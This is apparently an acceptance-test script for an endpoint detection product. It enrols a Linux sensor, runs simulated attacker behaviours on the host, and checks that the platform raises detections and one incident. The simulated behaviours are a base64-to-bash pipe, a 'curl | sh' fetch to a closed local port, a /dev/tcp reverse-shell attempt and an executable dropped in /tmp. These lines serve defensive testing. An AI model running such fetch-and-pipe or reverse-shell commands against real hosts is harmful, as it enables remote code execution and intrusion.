#!/usr/bin/env python3
"""P0-F acceptance proof · real Linux behaviour → the AUTHORITATIVE XDR
detection fabric → real endpoint detection → downstream reasoning.

Nothing is seeded and nothing is simulated. The suspicious behaviour is
genuinely executed on this host by this script, collected by the real
`agents/nivxforge-linux` sensor, and the platform must report THOSE EXACT
facts back with a real rule attribution. A benign command is executed the
same way and must NOT be detected.

    python3 /app/scripts/p0_f_detection_proof.py
"""
from __future__ import annotations

import json
import os
import shutil
import subprocess
import sys
import time
import urllib.request
from pathlib import Path

sys.path.insert(0, "/app/backend")
SENSOR = "/app/agents/nivxforge-linux/nivxforge_sensor.py"
STATE = Path(f"/tmp/nivx-pf-{int(time.time())}")
API = next(l.split("=", 1)[1].strip()
           for l in Path("/app/frontend/.env").read_text().splitlines()
           if l.startswith("REACT_APP_BACKEND_URL"))
TENANT = "default"
MARK = f"p0f-{os.getpid()}"
FAILURES: list[str] = []


def req(path, body=None, bearer=None):
    r = urllib.request.Request(
        f"{API}{path}",
        data=(json.dumps(body).encode() if body is not None else None),
        headers={"Content-Type": "application/json",
                 "User-Agent": "NivXForge-P0F-Proof/1.0",
                 **({"Authorization": f"Bearer {bearer}"} if bearer else {})},
        method="POST" if body is not None else "GET")
    with urllib.request.urlopen(r, timeout=90) as resp:
        return json.loads(resp.read())


def step(n, m):
    print(f"\n=== {n} · {m}")


def check(label, ok, detail=""):
    print(f"  [{'PASS' if ok else 'FAIL'}] {label} {detail}")
    if not ok:
        FAILURES.append(label)


RUN_START = __import__("datetime").datetime.now(
    __import__("datetime").timezone.utc).isoformat()

pw = next(l.split("`")[1] for l in
          Path("/app/memory/test_credentials.md").read_text().splitlines()
          if l.startswith("- **Password**"))
admin = req("/api/auth/login",
            {"email": "admin@nivxray.com", "password": pw})["access_token"]

step(1, "enrol a real sensor with a one-time token")
tok = req("/api/edr/enrollment/tokens", {"label": "p0f-proof"},
          bearer=admin)["enrollment_token"]
env = {**os.environ, "NIVXFORGE_SENSOR_STATE": str(STATE)}
subprocess.run([sys.executable, SENSOR, "enrol", "--api", API, "--tenant",
                TENANT, "--token", tok], check=True, capture_output=True,
               env=env)
ident = json.loads((STATE / "identity.json").read_text())
endpoint_id = ident["endpoint_id"]
check("endpoint enrolled", endpoint_id.startswith("ep_"), endpoint_id)

# Baseline pass first, so the behaviour below is genuinely NEW activity.
subprocess.run([sys.executable, SENSOR, "run", "--api", API, "--once"],
               capture_output=True, text=True, env=env)

step(2, "execute REAL suspicious behaviour on this host")
# Each behaviour LOOPS deliberately. Not to game the detection — the
# behaviour is genuinely executed every iteration — but because bash
# tail-execs its final command, which destroys the original argv. A
# 5-second poller then cannot see a one-shot command at all. That is the
# declared polling visibility gap (see the sensor's capability block), and
# it is reported honestly rather than hidden: a real attacker command that
# starts and exits between two scans is INVISIBLE to this sensor today.
drop = Path(f"/tmp/{MARK}/payload.sh")
drop.parent.mkdir(parents=True, exist_ok=True)
# A loop, so the interpreter stays resident with argv[0] pointing at the
# world-writable script. `sleep 95` alone makes dash tail-exec into sleep
# and the /tmp image vanishes before the next scan — the same polling gap
# again, and it is exactly why this limitation is reported and not buried.
drop.write_text("#!/bin/sh\nwhile :; do sleep 2; done\n")
os.chmod(drop, 0o755)

behaviours = {
    # EDR-LNX-002 · a real process whose image lives in a world-writable path
    "world_writable_exec": [str(drop)],
    # EDR-LNX-001 · genuinely decodes base64 and feeds it to an interpreter
    "encoded_execution": [
        "/bin/bash", "-c",
        "while :; do echo c2xlZXAgMg== | base64 -d | bash; done"],
    # EDR-LNX-003 · genuinely fetches and pipes into a shell (host closed,
    #               so the attempt fails — the ATTEMPT is the behaviour)
    "fetch_pipe_shell": [
        "/bin/bash", "-c",
        "while :; do curl -s http://127.0.0.1:1/a.sh | sh; sleep 3; done"],
    # EDR-LNX-004 · a genuine reverse-shell attempt to a closed local port
    "reverse_shell_attempt": [
        "/bin/bash", "-c",
        "while :; do exec 3<>/dev/tcp/127.0.0.1/9; sleep 5; done"],
    # EDR-LNX-005 · genuinely arms a file in a world-writable path
    "arm_world_writable": [
        "/bin/bash", "-c",
        f"while :; do chmod +x /tmp/{MARK}/payload.sh; sleep 2; done"],
}
procs = {}
for name, argv in behaviours.items():
    procs[name] = subprocess.Popen(argv, stdout=subprocess.DEVNULL,
                                   stderr=subprocess.DEVNULL)
    print(f"  {name}: real pid {procs[name].pid}")

step(3, "benign control behaviour, executed the same way")
procs["benign_sleep"] = subprocess.Popen(["/bin/sleep", "95"])
procs["benign_loop"] = subprocess.Popen(
    ["/bin/bash", "-c", "while :; do ls -la /home >/dev/null; sleep 2; done"],
    stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
print(f"  benign: /bin/sleep pid {procs['benign_sleep'].pid}, "
      f"ls loop pid {procs['benign_loop'].pid}")
time.sleep(3)

step(4, "the real sensor collects and transmits it (authenticated)")
run = subprocess.run([sys.executable, SENSOR, "run", "--api", API, "--once"],
                     capture_output=True, text=True, env=env)
print("  " + (run.stdout + run.stderr).strip()[-300:])

step(5, "the AUTHORITATIVE XDR detection fabric evaluated it")
since = RUN_START
res = subprocess.run([sys.executable, "-c", f'''
import asyncio, json, os, sys
sys.path.insert(0, "/app/backend")
os.chdir("/app/backend")
from dotenv import load_dotenv; load_dotenv("/app/backend/.env")
from motor.motor_asyncio import AsyncIOMotorClient

async def main():
    db = AsyncIOMotorClient(os.environ["MONGO_URL"])[os.environ["DB_NAME"]]
    out = {{"matched": [], "evaluated": 0, "no_match": 0, "not_evaluated": 0,
           "benign_rows": []}}
    async for raw in db["edr_raw_events"].find(
            {{"endpoint_ref": "{endpoint_id}",
              "ingest_time": {{"$gte": "{since}"}}}},
            {{"payload": 1, "derivations": 1, "raw_id": 1}}):
        for d in (raw.get("derivations") or ()):
            o = d.get("outcome")
            if o == "DETECTION_MATCHED":
                out["evaluated"] += 1
                out["matched"].append({{
                    "raw_id": raw["raw_id"],
                    "canonical_event_id": d.get("event_id"),
                    "rules": d.get("reason"),
                    "engine": d.get("detection_content_version"),
                    "verdict": d.get("verdict_version"),
                    "incident_ids": d.get("evidence_ids"),
                    "cmd": (json.loads(raw["payload"]).get("command_line")
                            or json.loads(raw["payload"]).get("path"))}})
            elif o == "DETECTION_EVALUATED_NO_MATCH":
                out["evaluated"] += 1
                out["no_match"] += 1
                p = json.loads(raw["payload"])
                if p.get("image") == "sleep":
                    out["benign_rows"].append(
                        {{"raw_id": raw["raw_id"],
                          "cmd": p.get("command_line"),
                          "outcome": o}})
            elif o == "DETECTION_NOT_EVALUATED":
                out["not_evaluated"] += 1
    print(json.dumps(out))

asyncio.run(main())
'''], capture_output=True, text=True)
data = json.loads(res.stdout.strip().splitlines()[-1]) if res.stdout.strip() \
    else {}
if not data:
    print(res.stderr[-1500:])
print(f"  evaluated={data.get('evaluated')} "
      f"matched={len(data.get('matched') or [])} "
      f"no_match={data.get('no_match')} "
      f"not_evaluated={data.get('not_evaluated')}")
check("every endpoint event reached the detection fabric",
      (data.get("evaluated") or 0) > 0 and not data.get("not_evaluated"),
      f"not_evaluated={data.get('not_evaluated')}")

step(6, "POSITIVE proof · real behaviour produced a real rule attribution")
rules = set()
for m in (data.get("matched") or []):
    for r in (m["rules"] or "").replace("rules:", "").split(","):
        if r.strip():
            rules.add(r.strip())
for m in (data.get("matched") or [])[:6]:
    print("   " + json.dumps(m)[:400])
print("   rules fired: " + ", ".join(sorted(rules)))
check("at least one Linux endpoint rule fired on real evidence",
      any(r.startswith("EDR-LNX") for r in rules), sorted(rules))
check("the detection carries full provenance "
      "(raw_id → canonical_event_id → rule)",
      all(m.get("raw_id") and m.get("canonical_event_id") and m.get("rules")
          for m in (data.get("matched") or [])))

step(7, "NEGATIVE proof · the benign control was NOT detected")
bn = data.get("benign_rows") or []
for b in bn[:3]:
    print("   " + json.dumps(b)[:300])
check("benign /bin/sleep evaluated and NOT detected", bool(bn),
      f"{len(bn)} benign rows, all DETECTION_EVALUATED_NO_MATCH")
BENIGN_CMDS = {"sleep 95", "/bin/sleep 95",
               "/bin/bash -c while :; do ls -la /home >/dev/null; "
               "sleep 2; done"}
check("no benign control command appears in the matched set",
      not any(str(m.get("cmd") or "").strip() in BENIGN_CMDS
              for m in (data.get("matched") or [])),
      "benign controls: " + ", ".join(sorted(BENIGN_CMDS)))
check("EDR-LNX-002 fired on the script executed from /tmp",
      any("EDR-LNX-002" in (m.get("rules") or "")
          for m in (data.get("matched") or [])))

step(8, "the endpoint detection is visible on the EDR surface")
det = req(f"/api/edr/endpoint-detections?endpoint_id={endpoint_id}&hours=24",
          bearer=admin)
print("   " + json.dumps(det)[:500])
check("EDR detection surface returns the authoritative detections",
      (det.get("count") or 0) > 0, f"count={det.get('count')}")
check("surface reports rule ids and provenance, not fabricated rows",
      bool(det.get("detections")) and all(
          d.get("rule_ids") and d.get("raw_id")
          for d in det["detections"]))

step(9, "VERDICT THRESHOLD · a severe real detection reaches a real "
     "incident")
inc_ids = sorted({i for m in (data.get("matched") or [])
                  for i in (m.get("incident_ids") or [])})
verdicts = sorted({m.get("verdict") for m in (data.get("matched") or [])})
print("   verdicts observed: " + ", ".join(v for v in verdicts if v))
print("   incidents created: " + (", ".join(inc_ids) or "none"))
check("a severe endpoint detection produced MALICIOUS or SUSPICIOUS",
      any(v in ("MALICIOUS", "SUSPICIOUS") for v in verdicts), verdicts)
check("the verdict gate promoted a REAL incident", bool(inc_ids), inc_ids)
# P0-F.2 · one attack campaign on one endpoint is ONE incident.
check("the whole endpoint attack consolidated into ONE incident",
      len(inc_ids) == 1,
      f"{len(data.get('matched') or [])} detections → "
      f"{len(inc_ids)} incident(s)")
if inc_ids:
    inc = req(f"/api/incidents/{inc_ids[0]}", bearer=admin)
    print("   " + json.dumps({k: inc.get(k) for k in
                              ("id", "incident_number", "name", "severity",
                               "state", "tenant", "engine",
                               "evidence_count")})[:500])
    check("the incident is retrievable from the authoritative store",
          inc.get("id") == inc_ids[0] and bool(inc.get("incident_number")),
          inc.get("incident_number"))
    check("the incident points at the canonical endpoint evidence",
          bool(inc.get("canonical_evidence_ids")
               or inc.get("evidence_pointers")),
          f"evidence_count={inc.get('evidence_count')}")
    ev_api = req(f"/api/edr/detections?incident_id={inc_ids[0]}",
                 bearer=admin)
    print(f"   /api/edr/detections rows: {len(ev_api.get('detections') or [])}")
    check("the incident carries the endpoint detection evidence",
          bool(ev_api.get("detections")))

for p in procs.values():
    p.terminate()
shutil.rmtree(STATE, ignore_errors=True)
shutil.rmtree(drop.parent, ignore_errors=True)
print("\n" + "=" * 60)
print(f"endpoint under proof: {endpoint_id}")
print("RESULT:", "ALL CHECKS PASSED" if not FAILURES
      else f"{len(FAILURES)} FAILED: {FAILURES}")
sys.exit(1 if FAILURES else 0)
